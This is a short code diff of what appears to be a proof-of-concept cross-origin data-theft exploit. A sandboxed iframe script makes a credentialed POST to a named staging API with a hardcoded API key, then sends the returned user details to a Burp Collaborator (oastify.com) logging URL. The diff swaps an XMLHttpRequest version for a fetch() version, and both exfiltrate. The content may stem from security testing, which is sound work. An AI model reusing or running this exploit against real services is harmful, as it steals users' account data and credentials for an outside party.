@@ -1,18 +1,22 @@
+
 <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="
     <script>
-        var req = new XMLHttpRequest();
-        req.onload = reqListener;
-        req.open('POST', 'https://staging.anuvadak.in/api/user/fetchUserDetails', true);
-        req.setRequestHeader('Content-Type', 'application/json'); // Set content type to JSON
-        req.withCredentials = true;
-
-        // Prepare the data you want to send in JSON format
-        var postData = JSON.stringify({'apikey':'24c7d571-7f5d-4932-aac7-cc024709297e'});
-
-        req.send(postData);
-
-        function reqListener() {
-            location = 'https://1kmon1mnysove88p3phfi4xyspygmka9.oastify.com/log?key=' + encodeURIComponent(this.responseText);
-        }
+        fetch('https://staging.anuvadak.in/api/user/fetchUserDetails', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json', // Indicate we're sending JSON
+            },
+            credentials: 'include', // Include cookies or authentication information if necessary
+            body: JSON.stringify({
+                apikey:'24c7d571-7f5d-4932-aac7-cc024709297e'
+            })
+        })
+        .then(response => response.json()) // Parse the response as JSON
+        .then(data => {
+            location = 'https://1kmon1mnysove88p3phfi4xyspygmka9.oastify.com/log?key=' + encodeURIComponent(JSON.stringify(data));
+        })
+        .catch(error => {
+            console.error('Error:', error);
+        });
     </script>
 "></iframe>
